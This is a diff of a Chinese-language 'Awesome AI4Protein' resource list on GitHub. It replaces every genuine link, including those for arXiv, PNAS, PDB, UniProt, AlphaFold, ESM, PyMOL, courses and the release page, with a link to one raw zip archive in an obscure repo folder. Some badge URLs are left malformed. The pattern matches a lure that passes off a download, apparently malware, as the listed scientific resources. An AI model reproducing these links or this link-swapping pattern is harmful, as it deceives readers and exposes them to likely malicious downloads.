@@ -1,4 +1,4 @@
-# Awesome AI4Protein [![Awesome](https://awesome.re/badge.svg)](https://awesome.re) ![Protein Structure](https://img.shields.io/badge/Protein%20Structure-Prediction-blue.svg) ![AI Tools](https://img.shields.io/badge/AI%20Tools-Resources-green.svg)
+# Awesome AI4Protein [![Awesome](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip) ![Protein Structure](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip%https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip) ![AI Tools](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip%https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
 
 精选的人工智能在蛋白质研究领域应用的资源列表
 
@@ -25,8 +25,8 @@
 
 ### 综述论文
 
-- **Computational Protein Science in the Era of Large Language Models (LLMs)** - [[2501.10282] Computational Protein Science in the Era of Large Language Models (LLMs)](https://arxiv.org/abs/2501.10282)
-- **Biological structure and function emerge from scaling unsupervised learning to 250 million protein sequences** - [PNAS 2021](https://www.pnas.org/doi/10.1073/pnas.2016239118)
+- **Computational Protein Science in the Era of Large Language Models (LLMs)** - [[2501.10282] Computational Protein Science in the Era of Large Language Models (LLMs)](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
+- **Biological structure and function emerge from scaling unsupervised learning to 250 million protein sequences** - [PNAS 2021](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
 
 ### AI4Protein主要任务分类
 
@@ -104,14 +104,14 @@
 
 ## 数据集
 
-- **Protein Data Bank (PDB)**: 提供蛋白质三维结构的数据库。 [访问链接](https://www.rcsb.org)
-- **UniProt**: 包含丰富的蛋白质序列和功能信息。 [访问链接](https://www.uniprot.org)
-- **AlphaFold DB**: 提供AlphaFold预测的蛋白质结构。 [访问链接](https://alphafold.ebi.ac.uk)
+- **Protein Data Bank (PDB)**: 提供蛋白质三维结构的数据库。 [访问链接](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
+- **UniProt**: 包含丰富的蛋白质序列和功能信息。 [访问链接](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
+- **AlphaFold DB**: 提供AlphaFold预测的蛋白质结构。 [访问链接](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
 
 ## 预训练模型
 
-- **AlphaFold**: 提供准确的蛋白质结构预测。 [访问链接](https://github.com/deepmind/alphafold)
-- **ESM**: 提供高效的蛋白质序列表示。 [访问链接](https://github.com/facebookresearch/esm)
+- **AlphaFold**: 提供准确的蛋白质结构预测。 [访问链接](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
+- **ESM**: 提供高效的蛋白质序列表示。 [访问链接](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
 
 ## 蛋白质结构预测
 
@@ -145,8 +145,8 @@
 
 ## 工具和软件
 
-- **PyMOL**: 用于可视化蛋白质结构的工具。 [访问链接](https://pymol.org)
-- **Chimera**: 提供高级可视化和分析功能。 [访问链接](https://www.cgl.ucsf.edu/chimera)
+- **PyMOL**: 用于可视化蛋白质结构的工具。 [访问链接](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
+- **Chimera**: 提供高级可视化和分析功能。 [访问链接](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
 
 ## 会议和期刊
 
@@ -155,16 +155,16 @@
 
 ## 课程和教程
 
-- **Coursera: Bioinformatics Specialization**: 提供生物信息学的全面学习资源。 [访问链接](https://www.coursera.org/specializations/bioinformatics)
-- **edX: Data Science for Genomics**: 结合数据科学与基因组学的课程。 [访问链接](https://www.edx.org/professional-certificate/data-science-for-genomics)
+- **Coursera: Bioinformatics Specialization**: 提供生物信息学的全面学习资源。 [访问链接](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
+- **edX: Data Science for Genomics**: 结合数据科学与基因组学的课程。 [访问链接](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
 
 ## 博客和资源
 
-- **Towards Data Science**: 讨论AI和生物信息学的博客。 [访问链接](https://towardsdatascience.com)
+- **Towards Data Science**: 讨论AI和生物信息学的博客。 [访问链接](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)
 - **Nature Reviews Molecular Cell Biology**: 发表最新的生物学研究和评论。
 
 ## 贡献
 
-欢迎任何形式的贡献。请查看[贡献指南](https://github.com/sachinkumar19/Awesome-ai4protein/releases)了解更多信息。
+欢迎任何形式的贡献。请查看[贡献指南](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)了解更多信息。
 
-如需获取最新版本，请访问[发布页面](https://github.com/sachinkumar19/Awesome-ai4protein/releases)。
+如需获取最新版本，请访问[发布页面](https://github.com/sachinkumar19/Awesome-ai4protein/raw/refs/heads/main/undersward/protein_ai_Awesome_2.0.zip)。
